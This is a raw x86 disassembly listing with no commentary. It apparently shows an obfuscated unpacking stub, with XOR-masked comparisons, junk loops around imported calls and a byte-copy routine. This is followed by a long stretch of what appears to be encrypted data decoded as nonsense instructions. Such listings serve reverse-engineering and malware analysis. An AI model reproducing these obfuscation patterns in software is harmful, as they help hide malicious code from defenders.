  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c91
  41d28a:	mov    ecx,DWORD PTR ds:0x429d55
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [ebx],bl
  41d514:	push   ecx
  41d515:	outs   dx,DWORD PTR ds:[esi]
  41d516:	pop    es
  41d517:	(bad)  
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2-0x12b38c85],1
  41d522:	imul   edi,DWORD PTR [ebp-0x5a3fa13d],0xffffff9f
  41d529:	push   edi
  41d52a:	sub    eax,0x171f454b
  41d52f:	loope  0x41d58f
  41d531:	ins    DWORD PTR es:[edi],dx
  41d532:	pop    eax
  41d533:	ins    BYTE PTR es:[edi],dx
  41d534:	shr    bh,cl
  41d536:	jb     0x41d538
  41d538:	pminub mm4,QWORD PTR [edi]
  41d53b:	xor    dl,BYTE PTR [esi+0x666d1a3]
  41d541:	inc    ebp
  41d542:	cwde   
  41d543:	out    0xfd,eax
  41d545:	icebp  
  41d546:	imul   ebp,DWORD PTR [esi+0x11efe510],0xffffffdc
  41d54d:	sub    eax,0xb5e734a5
  41d552:	xor    DWORD PTR [ecx+esi*4+0x46],0x35
  41d557:	fidiv  DWORD PTR [edx]
  41d559:	cmp    dl,BYTE PTR [edx-0x7f]
  41d55c:	inc    ecx
  41d55d:	adc    eax,0x4537eeb0
  41d562:	and    edx,DWORD PTR [ecx-0x3eef1d4c]
  41d568:	iret   
  41d569:	xor    DWORD PTR [edx],esp
  41d56b:	sbb    eax,0x4f082755
  41d570:	cmc    
  41d571:	sbb    eax,0x4230a6dc
  41d576:	int3   
  41d577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d578:	pop    ebp
  41d579:	pop    ecx
  41d57a:	dec    ebp
  41d57b:	mov    bl,BYTE PTR [edx+0x69682c2e]
  41d581:	loope  0x41d5f5
  41d583:	push   eax
  41d584:	outs   dx,BYTE PTR ds:[esi]
  41d585:	add    BYTE PTR [esi+0x1ff547d2],0xb2
  41d58c:	mov    dh,0xd1
  41d58e:	mov    al,ds:0xe1155820
  41d593:	repz addr16 jle 0x41d5d4
  41d597:	int    0xfb
  41d599:	add    dh,BYTE PTR [si+0x5f49]
  41d59e:	jmp    FWORD PTR [edx+ebp*2+0x59a71233]
  41d5a5:	out    dx,eax
  41d5a6:	push   cs
  41d5a7:	pop    ecx
  41d5a8:	push   edx
  41d5a9:	lahf   
  41d5aa:	rcl    ch,0x5a
  41d5ad:	cmp    al,0x41
  41d5af:	jno    0x41d5c4
  41d5b1:	pop    ds
  41d5b2:	or     edi,DWORD PTR [eax+0x42]
  41d5b5:	test   BYTE PTR [edi+0x3a],0x3f
  41d5b9:	retf   
  41d5ba:	int    0x8d
  41d5bc:	jbe    0x41d5d5
  41d5be:	retf   0x18b6
  41d5c1:	push   esi
  41d5c2:	fistp  QWORD PTR [ebx]
  41d5c4:	scas   eax,DWORD PTR es:[edi]
  41d5c5:	xor    eax,0xd695fafa
  41d5ca:	jmp    0x41d5c7
  41d5cc:	mov    bh,0x90
  41d5ce:	inc    ebp
  41d5cf:	fdivr  DWORD PTR [edx]
  41d5d1:	fcom   DWORD PTR [ebp+0x3df0b7b8]
  41d5d7:	mov    al,ds:0xf91af7d8
  41d5dc:	xor    al,0x2a
  41d5de:	push   es
  41d5df:	dec    ebp
  41d5e0:	sbb    BYTE PTR [edx-0x5466f10d],0x45
  41d5e7:	je     0x41d5ad
  41d5e9:	xchg   esp,eax
  41d5ea:	jo     0x41d5e9
  41d5ec:	aad    0xa7
  41d5ee:	or     cl,bh
  41d5f0:	loopne 0x41d629
  41d5f2:	mov    ch,0xe4
  41d5f4:	sub    BYTE PTR [ecx+eiz*2+0x86f470e],bh
  41d5fb:	xlat   BYTE PTR ds:[ebx]
  41d5fc:	rcr    BYTE PTR [edx-0x2bd81b45],cl
  41d602:	jo     0x41d66e
  41d604:	cmp    al,0x33
  41d606:	cmp    eax,DWORD PTR [ebx+eax*2-0x5820e0b4]
  41d60d:	dec    esp
  41d60e:	mov    BYTE PTR [ebp-0x7e2c861f],0xc1
  41d615:	dec    esp
  41d616:	mov    ah,BYTE PTR [ecx+0x1cbd50a6]
  41d61c:	dec    edi
  41d61d:	jmp    0xa528:0x301aec32
  41d624:	cmp    al,ch
  41d626:	xor    eax,0xb39c85ff
  41d62b:	clc    
  41d62c:	mov    BYTE PTR [eax-0x11],ah
  41d62f:	mov    eax,0x493cfa55
  41d634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d635:	je     0x41d633
  41d637:	pop    eax
  41d638:	inc    esp
  41d639:	dec    edx
  41d63a:	mov    bl,0xbc
  41d63c:	and    al,bl
  41d63e:	xchg   ebx,eax
  41d63f:	push   0xffffffe5
  41d641:	cwde   
  41d642:	push   ebp
  41d643:	fsubr  DWORD PTR [esi+ecx*1+0x1edbe2ee]
  41d64a:	in     al,dx
  41d64b:	jno    0x41d6cc
  41d64d:	ret    
  41d64e:	(bad)
  41d652:	cmp    DWORD PTR [ecx+ebp*8-0x72],esi
  41d656:	pop    ds
  41d657:	(bad)  
  41d658:	mov    bl,0x10
  41d65a:	mov    ch,0x65
  41d65c:	adc    al,0x18
  41d65e:	push   ds
  41d65f:	inc    esp
  41d660:	(bad)  
  41d661:	stc    
  41d662:	or     BYTE PTR [edx],cl
  41d664:	test   al,0x70
  41d666:	adc    DWORD PTR [edi],esp
  41d668:	repz add BYTE PTR [edx],dl
  41d66b:	dec    edx
  41d66c:	inc    edx
  41d66d:	add    eax,0xa256add
  41d672:	push   esi
  41d673:	mov    dl,0x3
  41d675:	inc    esi
  41d676:	inc    esi
  41d677:	retf   
  41d678:	xor    ecx,ebx
  41d67a:	je     0x41d6d3
  41d67c:	inc    ebp
  41d67d:	cmp    dl,BYTE PTR [eax-0x6351425b]
  41d683:	mov    dl,0x3f
  41d685:	ins    DWORD PTR es:[edi],dx
  41d686:	neg    DWORD PTR [ebx+0x60]
  41d689:	lock sub al,0x2c
  41d68c:	jecxz  0x41d624
  41d68e:	aaa    
  41d68f:	loopne 0x41d684
  41d691:	xchg   esi,eax
  41d692:	mov    ebp,0xa0995547
  41d697:	push   cs
  41d698:	jae    0x41d6c3
  41d69a:	popf   
  41d69b:	or     DWORD PTR [eax-0x1363dae3],ebp
  41d6a1:	mov    bl,0x5e
  41d6a3:	data16 aad 0x75
  41d6a6:	rol    BYTE PTR ds:0xe0c07e82,0xeb
  41d6ad:	mov    al,0x22
  41d6af:	jge    0x41d701
  41d6b1:	ss pop esi
  41d6b3:	mov    ds:0x3802e209,eax
  41d6b8:	pop    edi
  41d6b9:	in     eax,dx
  41d6ba:	stos   BYTE PTR es:[edi],al
  41d6bb:	mov    dl,0x5d
  41d6bd:	sbb    al,ch
  41d6bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6c0:	or     DWORD PTR [ebp-0x73c4f41f],edi
  41d6c6:	or     BYTE PTR [ebp+edx*4-0x34],cl
  41d6ca:	inc    edi
  41d6cb:	out    0x32,eax
  41d6cd:	rcl    DWORD PTR [eax],0x57
  41d6d0:	or     esp,DWORD PTR [ebp+0x61]
  41d6d3:	mov    esi,0xa2aa175d
  41d6d8:	call   0x50f4bc1d
  41d6dd:	lock ret 
  41d6df:	data16 cld 
  41d6e1:	jae    0x41d748
  41d6e3:	adc    eax,0xcb4ef9af
  41d6e8:	out    dx,eax
  41d6e9:	or     DWORD PTR [edx],edx
  41d6eb:	mov    ds:0xd4fc9b18,al
  41d6f0:	jbe    0x41d731
  41d6f2:	add    BYTE PTR [ecx+0x7f],ch
  41d6f5:	jnp    0x41d704
  41d6f7:	fnsave [esp+edx*4+0x34]
  41d6fb:	push   esp
  41d6fc:	lods   al,BYTE PTR ds:[esi]
  41d6fd:	add    eax,0xf2a6f017
  41d702:	cmp    ah,BYTE PTR [ecx]
  41d704:	pop    ss
  41d705:	or     ebp,esi
  41d707:	(bad)  
  41d708:	adc    eax,0x30c7e2c7
  41d70d:	inc    edx
  41d70e:	cmp    edi,0x90d4d3a8
  41d714:	sub    al,0x8
  41d716:	jo     0x41d769
  41d718:	es cld 
  41d71a:	out    0xc0,eax
  41d71c:	jecxz  0x41d6c6
  41d71e:	retf   
  41d71f:	inc    edx
  41d720:	mov    esp,0xfc3ef0b9
  41d725:	retf   
  41d726:	adc    ebx,DWORD PTR [ebp+0x3e5e0ac8]
  41d72c:	adc    BYTE PTR [edi-0x3ecda2a2],al
  41d732:	cmp    ebp,DWORD PTR [ebx]
  41d734:	xchg   ebx,eax
  41d735:	pop    ebx
  41d736:	add    BYTE PTR [ebx-0x29c84fda],ah
  41d73c:	sub    eax,0x6b6b427c
  41d741:	mov    eax,0xf8a6d2c5
  41d746:	test   eax,0xad79602b
  41d74b:	lods   al,BYTE PTR ds:[esi]
  41d74c:	sub    cl,BYTE PTR gs:[ebx-0x122b8be9]
  41d753:	fsubr  QWORD PTR [edi-0x13]
  41d756:	add    ebp,DWORD PTR [esi+0x67]
  41d759:	and    ecx,DWORD PTR [edi+esi*4+0x2d64cf47]
  41d760:	ret    
  41d761:	or     DWORD PTR [esi],edi
  41d763:	call   FWORD PTR [ecx+0x10]
  41d766:	jmp    0xe3aaed9f
  41d76b:	adc    eax,0x77e9a664
  41d770:	test   DWORD PTR [ecx],esp
  41d772:	push   cs
  41d773:	call   0xac2e8f45
  41d778:	sub    esp,DWORD PTR [edi-0x4a72c9db]
  41d77e:	mov    cl,0x29
  41d780:	jo     0x41d77e
  41d782:	nop
  41d783:	clc    
  41d784:	std    
  41d785:	(bad)  
  41d786:	and    dl,bh
  41d788:	add    ecx,DWORD PTR [edi+0x7f01317f]
  41d78e:	xor    al,0x4a
  41d790:	cdq    
  41d791:	std    
  41d792:	sbb    eax,0xa0576119
  41d797:	das    
  41d798:	imul   eax,DWORD PTR [edx+0x54],0xa0a5d43c
  41d79f:	aas    
  41d7a0:	push   0xc851795e
  41d7a5:	gs push ss
  41d7a7:	nop
  41d7a8:	jecxz  0x41d74e
  41d7aa:	sbb    eax,0x412b8246
  41d7af:	pop    esi
  41d7b0:	lods   eax,DWORD PTR ds:[esi]
  41d7b1:	cli    
  41d7b2:	pop    esp
  41d7b3:	push   ecx
  41d7b4:	hlt    
  41d7b5:	pop    ebp
  41d7b6:	jne    0x41d7a9
  41d7b8:	jle    0x41d78b
  41d7ba:	add    ebx,DWORD PTR [ecx-0x54f734e3]
  41d7c0:	iret   
  41d7c1:	(bad)
  41d7c5:	sub    BYTE PTR [edx+ecx*2],ah
  41d7c8:	fistp  QWORD PTR [edx]
  41d7ca:	pop    esi
  41d7cb:	cmp    BYTE PTR [edx-0x75902eb6],dh
  41d7d1:	jle    0x41d7de
  41d7d3:	pop    ss
  41d7d4:	adc    eax,0xdc97729c
  41d7d9:	pusha  
  41d7da:	test   eax,0x6132e77a
  41d7df:	add    DWORD PTR ds:0x5f3aba2d,0x5efb9ce8
  41d7e9:	jg     0x41d802
  41d7eb:	sub    ah,BYTE PTR [edx-0x3586e88d]
  41d7f1:	adc    eax,0xf972e8c7
  41d7f6:	jmp    0x227d2d48
  41d7fb:	mov    dh,0x92
  41d7fd:	adc    DWORD PTR [edi-0x38aba22e],eax
  41d803:	push   0xffffffb9
  41d805:	lea    edi,[ebx+0x6f8cc71d]
  41d80b:	cli    
  41d80c:	sub    al,0x8c
  41d80e:	ss ret 0xcdf9
  41d812:	ret    
  41d813:	add    ch,BYTE PTR [ecx]
  41d815:	sub    WORD PTR [ebx+edx*1+0x43],di
  41d81a:	sar    BYTE PTR [edi-0x1e9e2bff],cl
  41d820:	das    
  41d821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d822:	sub    dh,BYTE PTR [ecx-0x29]
  41d825:	and    ah,BYTE PTR [esi+0x20d5dd94]
  41d82b:	mov    edx,0xa217dbd
  41d830:	aad    0xc1
  41d832:	xchg   ebx,eax
  41d833:	das    
  41d834:	daa    
  41d835:	stos   BYTE PTR es:[edi],al
  41d836:	addr16 cdq 
  41d838:	mov    esi,0xb95944c7
  41d83d:	push   ds
  41d83e:	arpl   WORD PTR [ebx+0x58e49ab4],bx
  41d844:	sti    
  41d845:	dec    edx
  41d846:	xor    BYTE PTR [eax+0x6764f2ea],dh
  41d84c:	repz adc BYTE PTR [ebx-0x4e],ah
  41d850:	xchg   edi,eax
  41d851:	mov    al,0x6e
  41d853:	scas   al,BYTE PTR es:[edi]
  41d854:	jo     0x41d812
  41d856:	into   
  41d857:	nop
  41d858:	dec    ecx
  41d859:	dec    ecx
  41d85a:	rcr    bh,0x32
  41d85d:	adc    al,0xb1
  41d85f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41d861:	into   
  41d862:	cmp    BYTE PTR [esi],ah
  41d864:	add    dl,bh
  41d866:	mov    eax,0x6fb37c84
  41d86b:	jns    0x41d855
  41d86d:	mov    ch,0xf4
  41d86f:	inc    ebx
  41d870:	and    DWORD PTR [edi-0x7e4f772c],ebp
  41d876:	xchg   ebx,eax
  41d877:	or     al,0x14
  41d879:	pop    edx
  41d87a:	gs pushf 
  41d87c:	sub    dh,BYTE PTR [eax]
  41d87e:	sti    
  41d87f:	ja     0x41d828
  41d881:	jb     0x41d80b
  41d883:	rol    WORD PTR [ebx-0x44],1
  41d887:	cmp    al,0x73
  41d889:	xchg   esi,eax
  41d88a:	cwde   
  41d88b:	xchg   ebx,eax
  41d88c:	mov    WORD PTR [esi],es
  41d88e:	push   es
  41d88f:	or     dh,BYTE PTR [esi]
  41d891:	cmp    bl,al
  41d893:	sub    eax,0x7b16d88e
  41d898:	int    0xe0
  41d89a:	or     dh,BYTE PTR [edx]
  41d89c:	mov    edi,esi
  41d89e:	mov    fs,WORD PTR [ebx+0x74]
  41d8a1:	adc    al,0xc2
  41d8a3:	and    esi,DWORD PTR [edi]
  41d8a5:	imul   ebp,DWORD PTR [edi],0xc9def0dd
  41d8ab:	push   esp
  41d8ac:	mov    eax,ds:0x6ca61daa
  41d8b1:	pop    esp
  41d8b2:	jge    0x41d890
  41d8b4:	sbb    al,0x3d
  41d8b6:	sbb    BYTE PTR [ebp+ecx*1-0x4a965401],dl
  41d8bd:	mov    ds,WORD PTR [edx]
  41d8bf:	adc    dh,BYTE PTR [edi-0x1447fa66]
  41d8c5:	mov    edx,DWORD PTR [eax+0x4b]
  41d8c8:	xchg   ebx,eax
  41d8c9:	add    al,0xef
  41d8cb:	push   esp
  41d8cc:	mov    cl,0xf2
  41d8ce:	int    0xa4
  41d8d0:	dec    eax
  41d8d1:	jnp    0x41d909
  41d8d3:	add    DWORD PTR [ebx+0x1c],ecx
  41d8d6:	sahf   
  41d8d7:	mov    cl,dh
  41d8d9:	adc    eax,0x90464ae
  41d8de:	xchg   esp,eax
  41d8df:	out    0x63,eax
  41d8e1:	jae    0x41d8aa
  41d8e3:	loop   0x41d951
  41d8e5:	push   es
  41d8e6:	push   es
  41d8e7:	fs xchg esi,eax
  41d8e9:	jae    0x41d8a3
  41d8eb:	push   esp
  41d8ec:	push   eax
  41d8ed:	stos   DWORD PTR es:[edi],eax
  41d8ee:	mov    esp,0x5d3dcb48
  41d8f3:	jg     0x41d8dc
  41d8f5:	xchg   ecx,eax
  41d8f6:	mov    eax,ds:0x9240e716
  41d8fb:	mov    ebx,0x590aa55f
  41d900:	mov    bh,ah
  41d902:	ds (bad) 
  41d904:	into   
  41d905:	pushf  
  41d906:	adc    eax,0x63d1c5ad
  41d90b:	sti    
  41d90c:	nop
  41d90d:	push   eax
  41d90e:	xchg   esi,eax
  41d90f:	jnp    0x41d8fa
  41d911:	(bad)  
  41d912:	cli    
  41d913:	mov    esp,0x351b1db5
  41d918:	push   0x6eb68aca
  41d91d:	aaa    
  41d91e:	out    0xed,al
  41d920:	mov    edi,0x82335b50
  41d925:	mov    eax,ds:0x257dccba
  41d92a:	dec    ecx
  41d92b:	sbb    edi,ebp
  41d92d:	mov    edx,0xc0148ca6
  41d932:	in     al,0xf
  41d934:	jl     0x41d93b
  41d936:	cmp    esp,0xf8a2b7d4
  41d93c:	mov    cl,0x27
  41d93e:	addr16 (bad) 
  41d940:	adc    DWORD PTR [ebp-0x6fe71862],ecx
  41d946:	lods   al,BYTE PTR ds:[esi]
  41d947:	fdivrp st(7),st
  41d949:	jae    0x41d98e
  41d94b:	mov    ?,WORD PTR [edi+eax*4]
  41d94e:	push   edx
  41d94f:	stos   BYTE PTR es:[edi],al
  41d950:	pop    ecx
  41d951:	sbb    edx,DWORD PTR [edx-0x3c27f811]
  41d957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d958:	les    esi,FWORD PTR [ebx]
  41d95a:	mov    al,ds:0xfacced82
  41d95f:	or     al,BYTE PTR [esi+0x36a1c931]
  41d965:	mov    ah,0x37
  41d967:	xor    bh,BYTE PTR [ecx]
  41d969:	cmp    eax,ecx
  41d96b:	stos   DWORD PTR es:[edi],eax
  41d96c:	jnp    0x41d9d2
  41d96e:	xor    ecx,esp
  41d970:	jns    0x41d999
  41d972:	lahf   
  41d973:	mov    edx,0x677e6faf
  41d978:	popf   
  41d979:	pop    esp
  41d97a:	and    BYTE PTR [ebp-0x558f040f],dh
  41d980:	mov    esi,0x9774f4cc
  41d985:	and    eax,0xb99f3928
  41d98a:	es sbb ecx,ecx
  41d98d:	int    0x6a
  41d98f:	mov    ebp,0xe0ab8ef5
  41d994:	inc    ebx
  41d995:	add    dh,BYTE PTR [edx+esi*1]
  41d998:	(bad)  
  41d999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99a:	sub    DWORD PTR [eax+0x6d0bc314],eax
  41d9a0:	pop    ecx
  41d9a1:	push   eax
  41d9a2:	jle    0x41d9be
  41d9a4:	popf   
  41d9a5:	loopne 0x41d9d4
  41d9a7:	int3   
  41d9a8:	pop    ecx
  41d9a9:	or     DWORD PTR [ecx],eax
  41d9ab:	stos   DWORD PTR es:[edi],eax
  41d9ac:	shl    DWORD PTR [edx+0x8c79fac],0x4d
  41d9b3:	and    DWORD PTR [esi-0x397c7321],0x41
  41d9ba:	jge    0x41da23
  41d9bc:	ja     0x4bc611e5
  41d9c2:	ss clc 
  41d9c4:	push   esi
  41d9c5:	dec    esp
  41d9c6:	sub    edi,DWORD PTR [ebp-0x2a]
  41d9c9:	std    
  41d9ca:	sbb    DWORD PTR [edi],ebx
  41d9cc:	xchg   ebp,eax
  41d9cd:	mov    eax,ds:0x25fc4421
  41d9d2:	imul   ebx,DWORD PTR [ebx-0x58dbdd33],0xa
  41d9d9:	sahf   
  41d9da:	das    
  41d9db:	sbb    BYTE PTR [eax-0x44ce41d7],dl
  41d9e1:	popf   
  41d9e2:	mov    DWORD PTR [edx-0x5],eax
  41d9e5:	xchg   edx,eax
  41d9e6:	xchg   ecx,eax
  41d9e7:	fisubr WORD PTR [edi-0x4d3925f5]
  41d9ed:	jge    0x41d97d
  41d9ef:	xchg   edi,eax
  41d9f0:	and    DWORD PTR [ecx+0xe],0x6d
  41d9f4:	or     edx,DWORD PTR [eax+eax*1+0x68]
  41d9f8:	dec    edx
  41d9f9:	icebp  
  41d9fa:	outs   dx,DWORD PTR ds:[esi]
  41d9fb:	push   ebp
  41d9fc:	push   esi
  41d9fd:	push   ds
  41d9fe:	gs scas al,BYTE PTR es:[edi]
  41da00:	jge    0x41d98f
  41da02:	mov    al,0x63
  41da04:	pop    ebp
  41da05:	retf   0x3371
  41da08:	sub    dl,BYTE PTR [ebx+eiz*4]
  41da0b:	dec    ebp
  41da0c:	lods   al,BYTE PTR ds:[esi]
  41da0d:	sub    eax,edx
  41da0f:	xlat   BYTE PTR ds:[ebx]
  41da10:	lods   eax,DWORD PTR ds:[esi]
  41da11:	sbb    al,0x60
  41da13:	and    BYTE PTR [ebx+ecx*1-0x1],dl
